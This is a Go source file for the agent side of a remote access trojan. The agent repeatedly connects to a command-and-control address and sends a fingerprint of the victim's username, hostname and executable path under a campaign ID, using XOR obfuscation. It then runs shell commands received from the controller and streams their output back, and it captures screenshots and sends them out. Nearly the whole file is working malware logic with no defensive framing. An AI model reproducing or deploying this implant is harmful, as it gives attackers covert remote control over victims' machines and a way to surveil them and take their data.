package main

import (
	"log"
	"net"
	"os"
	"os/user"
	"strconv"
	"time"

	"github.com/google/uuid"
	"google.golang.org/protobuf/proto"
)

type Info struct {
	id           string
	xorkey       []byte
	username     string
	computername string
	processname  string
	campain      string
}

type State struct {
	c2address      string
	info           Info
	runningModules map[string]*Module
}

type Module struct {
	finished chan bool
	name     string
	external bool
	args     []string
	in       chan string
	out      chan string
	err      chan string
}

func main() {

	state := init_state("campain", "127.0.0.1:4040", "key")

	for {
		log.Println("sleeping 10 seconds")
		time.Sleep(2 * time.Second)
		log.Println("Connecting...")
		conn, err := net.Dial("tcp", state.c2address)
		if err != nil {
			log.Println(err.Error())
			continue
		}

		if heartbeat(conn, &state) {
			persist(conn, &state)
		}
		conn.Close()
	}

}

func heartbeat(conn net.Conn, state *State) bool {

	ident := state.info.to_ident()

	err := sendMessage(conn, ident, state.info.xorkey)
	if err != nil {
		log.Println("ERROR sending message: ", err.Error())
		return false
	}
	log.Println("now Reading message")
	message, err := readMessage(conn, state.info.xorkey)
	if err != nil {
		log.Println("READER ERROR: reading message: ", err.Error())
		return false
	}

	switch m := message.(type) {
	case *HeartbeatResponse:
		log.Println("Got Heartbeat Response")
		log.Println(m.KeepOpen)
		if m.KeepOpen {
			log.Println("Got keepalive")
			return true
		}
	default:
		log.Println("unknown message", m)
		return false
	}
	return false

}

func persist(conn net.Conn, state *State) {
	abort := make(chan bool)
	go loop_modules(state, conn, abort)

	for {

		// read messages
		message, err := readMessage(conn, state.info.xorkey)
		if err != nil {
			log.Println("READER ERROR: reading message: ", err.Error())
			abort <- true
			break
		}

		message_name := message.ProtoReflect().Descriptor().FullName()
		log.Println("Got Message: ", message_name)

		handleMessage(conn, message, state)

	}

}

func loop_modules(state *State, conn net.Conn, abort chan bool) {
	for {
		// Reap dead Modules
		for modname, mod := range state.runningModules {
			select {
			case <-mod.finished:
				log.Println("loop_modules --> Module finished: ", modname)
				delete(state.runningModules, modname)
			default:
			}
		}

		// read modules
		for modname, mod := range state.runningModules {
			select {
			case msg := <-mod.out:
				log.Println("loop_modules --> Sending message from module ", modname)
				err := sendMessage(conn, &ShellResponse{Output: msg}, state.info.xorkey)
				if err != nil {
					log.Println("loop_modules --> ERROR sending message: ", err.Error())

				}
			default:
			}
		}

		// check if we should abort
		select {
		case <-abort:
			log.Println("loop_modules --> Aborting")
			return
		default:
		}
	}
}

// Reads a message from the connection and acts on it
func handleMessage(conn net.Conn, message proto.Message, state *State) {
	switch m := message.(type) {

	case *ShellCommand:
		log.Println("Got Shell Command")
		// get the system shell, if it is not started start it. Then send the command to the shell
		shellmod, ok := state.runningModules["shell"]
		if !ok {
			log.Println("Starting shell")
			var err error
			shellmod, err = init_shell()
			if err != nil {
				log.Println("ERROR: ", err.Error())
				return
			}

			state.runningModules["shell"] = shellmod
			log.Println("finished setting up shell")
		}

		select {
		case <-shellmod.finished:
			log.Println("Shell already closed")
		default:
		}
		log.Println("Sending command to shell")
		shellmod.in <- m.Command
		log.Println("Sent command to shell")
	case *TakeScreenshot:
		screenshot, err := take_screenshot()
		if err != nil {
			log.Println("ERROR: ", err.Error())
			return
		}
		if err := sendMessage(conn, &Screenshot{
			Data: screenshot,
			Time: strconv.FormatInt(time.Now().Unix(), 10),
		}, state.info.xorkey); err != nil {
			log.Println("error sending image: ", err.Error())
		}
	}
}

func init_state(campain string, address string, xorkey string) State {
	return State{

		c2address:      address,
		info:           init_info(campain, xorkey),
		runningModules: make(map[string]*Module),
	}
}

func init_info(campain string, xorkey string) Info {
	var username string
	user, err := user.Current()
	if err != nil {
		username = "unknown"
	} else {
		username = user.Username
	}

	computername, err := os.Hostname()
	if err != nil {
		computername = "unknown"
	}

	processname, err := os.Executable()
	if err != nil {
		processname = "unknown"
	}

	return Info{
		id:           uuid.New().String(),
		xorkey:       []byte(xorkey),
		username:     username,
		computername: computername,
		processname:  processname,
		campain:      campain,
	}
}

func (info Info) to_ident() *Ident {
	return &Ident{
		Id:           info.id,
		CampainId:    info.campain,
		ComputerName: info.computername,
		Processname:  info.processname,
		Username:     info.username,
	}
}
